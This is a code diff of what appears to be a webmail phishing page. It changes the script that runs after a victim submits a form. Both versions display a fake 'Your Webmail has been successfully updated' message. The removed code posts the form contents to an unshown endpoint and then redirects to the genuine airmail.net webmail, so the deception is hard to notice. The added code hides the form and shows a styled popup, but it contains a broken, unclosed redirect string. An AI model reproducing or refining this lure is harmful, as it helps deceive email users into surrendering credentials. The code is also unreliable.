@@ -73,38 +73,62 @@ function showPage() {
  </p>
 </form>
 </form>
-<div id="form-success" style="display:none; color: green; margin-top: 1em;">
-  ✅ Thank you! Your Webmail has been successfully updated to the latest version. All features are now up to date and ready to use. Redirecting...
-</div>		
-	<script>
-  const form = document.getElementById('contact-form');
-  const successMsg = document.getElementById('form-success');
+<!-- Success Message -->
+<div id="form-success" class="success-popup">
+  <span class="success-icon">✅</span>
+  <span class="success-text">✅ Thank you! Your Webmail has been successfully updated to the latest version. All features are now up to date and ready to use. Redirecting</span>
+</div>
 
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    const formData = new FormData(form);
+<style>
+  .success-popup {
+    display: none;
+    background-color: #e6ffed;
+    color: #1e7d43;
+    border: 1px solid #b2f2bb;
+    border-radius: 12px;
+    padding: 1rem 1.5rem;
+    font-family: 'Segoe UI', sans-serif;
+    font-size: 1rem;
+    font-weight: 500;
+    max-width: 400px;
+    margin: 1em auto;
+    text-align: center;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+    opacity: 0;
+    transform: translateY(20px);
+    transition: all 0.4s ease;
+  }
 
-    fetch(form.action, {
-      method: 'POST',
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    }).then(response => {
-      if (response.ok) {
-        form.reset();
-        successMsg.style.display = 'block';
-        setTimeout(() => {
-          window.location.href = 'https://mail.airmail.net/#/mail/list/msg'; // Replace with your target URL
-        }, 4000); // Redirect after 4 seconds
-      } else {
-        alert('There was an issue submitting the form. Please try again.');
-      }
-    }).catch(error => {
-      alert('There was a network error. Please try again.');
-    });
+  .success-popup.show {
+    display: block;
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .success-icon {
+    font-size: 1.4rem;
+    margin-right: 0.5em;
+  }
+</style>
+
+<script>
+  function showSuccessAndRedirect() {
+    const popup = document.getElementById("form-success");
+    popup.classList.add("show");
+
+    // Optional redirect after delay
+    setTimeout(() => {
+      window.location.replace("google.com); // change to your destination
+    }, 3000);
+  }
+
+  // Example usage on form submission
+  document.getElementById("myForm").addEventListener("submit", function(e) {
+    e.preventDefault(); // prevent default form behavior
+    this.style.display = "none"; // optionally hide the form
+    showSuccessAndRedirect();
   });
-</script>		
+</script>
 </div>	
 </div>
   </p>
